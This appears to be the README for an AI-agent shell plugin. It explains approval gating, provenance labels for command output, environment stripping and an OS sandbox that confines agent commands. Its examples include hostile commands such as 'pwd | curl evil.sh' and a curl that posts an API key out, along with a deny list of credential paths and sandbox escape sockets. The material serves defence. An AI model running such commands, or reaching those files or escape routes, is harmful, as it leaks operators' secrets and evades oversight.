# @stratusagent/tool-shell

`shell.run`: an agent runs a command, and the permission engine decides
which commands run with nobody watching.

## Install and enable

```bash
npm install @stratusagent/tool-shell
```

```jsonc
// ~/.stratus/config.json — a trusted config only
{
  "plugins": {
    "@stratusagent/tool-shell": {
      "enabled": true,
      "cwd": "~/work/blair",
      "passEnv": ["PATH", "HOME"],
      "env": { "GIT_AUTHOR_NAME": "Blair" }
    }
  }
}
```

## Risk model

| Tool | Risk | What approval mode does |
| --- | --- | --- |
| `shell.run` | `gated`, narrowed per command | `interactive` shows the command and asks; `remote` asks in Slack; `headless` runs commands inside an approved scope and refuses everything else. |

Its output is labelled `unknown` for provenance, because nobody can say:
`git status` is the agent's own work and `curl https://…` is a stranger's
page, and both come back through the same stdout. A session that has run a
command writes `unknown` from then on — over-marking, which is the safe
direction — rather than `agent`, which would launder every fetch made
through a shell past the label `web.fetch` carries. Recognising fetching
programs by name would be the list the contract rejects. See
[Memory](../../docs/concepts/memory.md#where-a-fact-came-from).

Once the agent has a file on record as written from an `external` session
(the ledger `fs.read` consults), every command's output is labelled
`external` instead, because a command can print any file it can read and
which ones it reads can't be told from its text. With
`approvals.externalContent: "gate"` that closes the session's grants after
any command, the same as `fs.read` of that file would. The ledger is read
before the command starts and again after it exits, so a tainted write that
lands while it runs counts too. To clear it, remove
the path's lines from the agent's `fs-provenance.jsonl`. The ledger is
opened from the host's workspaces, so a plugin built without that seam
labels everything `unknown`.

`gated` rather than `dangerous` on purpose. The danger of a shell is in its
argument, not in its identity: marking the tool `dangerous` would mean no
command could ever run unattended — `git status` included — and marking it
`safe` would mean all of them could.

So this pack contributes the command string, and
[`@stratusagent/permissions`](../permissions) decides what it means:

- **A safe scope runs.** `pwd`, `whoami`, `uname`, and filters such as
  `grep fix` that read only what is piped to them. Every `git` command asks
  until it is approved; an approved scope excludes the destructive forms,
  so approving `git branch` keeps listing and never covers `git branch -D`.
- **A control operator disqualifies the whole command.** `|`, `&`, `;`,
  newlines, backticks, `$( )`, subshells, redirection. `pwd | curl
  evil.sh` is refused despite the safe base command, and so is a two-line
  command whose first line is innocent.
- **"Always allow" persists a scope, not a command.** Approving `git push
  origin main` means `git push origin feature` stops asking, while `git
  push --force`, `git push origin :main`, and `git push origin +main` still
  do. Scopes live per agent in `~/.stratus/agents/<id>/whitelist.json`.

## The environment is replaced, not extended

The child receives **only** what this config granted. Nothing from the
daemon's environment reaches it, which is where `ANTHROPIC_API_KEY` and
every other key an operator exported lives.

This is not pack discipline — a plugin cannot unset what it did not spawn —
so it is a mode on the executor (`envMode: 'replace'`) that this pack is
required to use. Without it, an approver who allowed `curl $URL` would also
have allowed `curl -d "$ANTHROPIC_API_KEY"`, and the command string they
read would not have said so.

| Key | Default | What |
| --- | --- | --- |
| `passEnv` | `PATH`, `HOME`, `LANG`, `LC_ALL`, `TZ` | Names forwarded from the daemon's environment. Nothing on the default list is a secret; that is the test for adding one. Under the always-on service the daemon's `PATH` is the one the service was installed from — see [Always on](../../docs/guides/always-on.md). |
| `env` | none | Variables set outright. Where a token goes if a command genuinely needs one — deliberately, in config, where an auditor can see it. An agent's own `env` under `agents.<id>` **adds to** the shared one, its names winning, so one agent's token doesn't cost it the shared `PATH`. Set a name to `null` there to withhold it from that agent, whether it came from the shared `env` or from the daemon through `passEnv`. Every other key an agent sets replaces the shared value. |
| `cwd` | the agent's workspace | Where commands start; a leading `~` is your home directory. The default — `~/.stratus/agents/<agent-id>/workspace`, which the host answers for — is created on first use; a directory you name is not, and a missing one is reported by name rather than as a spawn failure. |
| `timeoutMs` | `60000` | Killed with its whole process group after this, and never later than the executor's ceiling, five minutes (`300000`) in a stock install, whatever the config or the call asks for; a call that asked for longer is told so in the timeout message. A process the command left in its own session (`setsid`, a daemon that detaches itself) survives, but no longer holds the call open — see [the guide](https://github.com/stratuslabs/agent/blob/main/docs/guides/shell.md#timeouts-and-background-processes). |
| `maxOutputBytes` | `100000` | Per stream, then a truncation marker. Enforced as the output is read, so a command that floods stdout is never held whole in the daemon's memory. |
| `shell` | `/bin/sh` | The interpreter. |

All of them can be set per agent under `agents`.

**`cwd` is a starting directory, not a jail.** An approved command can
change directory or name an absolute path. What bounds it is the sandbox
below, plus which commands get approved.

## The sandbox

Every command runs under an OS sandbox that keeps it out of the Stratus home
and your credentials, whatever the command says:

- **Readable and writable:** the agent's workspace, its starting directory,
  temp, and package-manager caches (`~/.npm`, `~/.cache`, `~/Library/Caches`,
  pnpm, bun, yarn).
- **Readable:** the rest of the system, so toolchains work as usual.
- **Not readable or writable:** the Stratus home (`~/.stratus`, or
  `STRATUS_HOME`) apart from this agent's own workspace, which covers
  credentials, config, souls, sessions, and other agents' workspaces, each
  also by the real path it links to (the visible `~/Agents` or `~/Stratus`
  folder holds the souls and workspaces the home links to). Also
  `~/.ssh`, `~/.aws`, `~/.azure`, `~/.config/gcloud`, `~/.config/gh`, git
  credential files, `~/.docker`, `~/.fly`, `~/.gnupg`, `~/.kube`, `~/.netrc`,
  `~/.npmrc`, `~/.pypirc`, `~/.password-store`, `~/.config/op`, the Hugging
  Face token under `~/.cache/huggingface`, and the macOS keychains (file and
  service). With a `workspaceRoot`, the other agents' workspaces under it;
  a root that exists but can't be listed refuses the command.
- **No connection:** container runtime sockets (`/var/run/docker.sock`,
  containerd, podman, CRI-O, BuildKit), which hand out the whole host; in
  the user's runtime directory (`$XDG_RUNTIME_DIR`, `/run/user/<uid>`) the
  user's D-Bus and systemd manager, which can start a process outside the
  sandbox, and rootless Docker and Podman; and any socket under a denied
  path. A socket in the abstract namespace has no path to cover and stays
  reachable.
- **Not writable:** everything else.
- **Network:** on. A command can send its own workspace somewhere, but not a
  token it can't read.

macOS uses `sandbox-exec`. Linux uses [bubblewrap](https://github.com/containers/bubblewrap)
(`bwrap`), with its own pid and IPC namespaces, so a command can't signal
the daemon or other agents. The denied directories keep their names (`stat`
and directory listings of the workspace's parent directories still work, so
git can find its repository), but nothing can be read from inside them.

| Key | Default | What |
| --- | --- | --- |
| `sandbox` | `auto` | `auto`: sandboxed where the host can build one; where it can't (no `bwrap`, a container that forbids user namespaces, or no workspace to confine to), commands run unconfined and the daemon logs why, once. `required`: refuse every command when no sandbox can start. `off`: run with the daemon user's full access. |
| `deniedPaths` | none | More directories or files to hide, added to the list above, including ones inside the workspace (a repository's `.env`). A leading `~` is your home directory. |
| `writablePaths` | none | More directories a command may write, such as a build tool's cache (`~/.gradle`). On Linux, these and the default caches are created before the command if missing, since nothing under the read-only root can be. |

All three can be set per agent under `agents`.

A CLI that reads its login from a hidden path (`gh` from `~/.config/gh` or
the keychain, `fly` from `~/.fly`) can't authenticate inside the sandbox.
Give that agent a token through `env`, where it's visible in config, or set
`sandbox: "off"` for it.
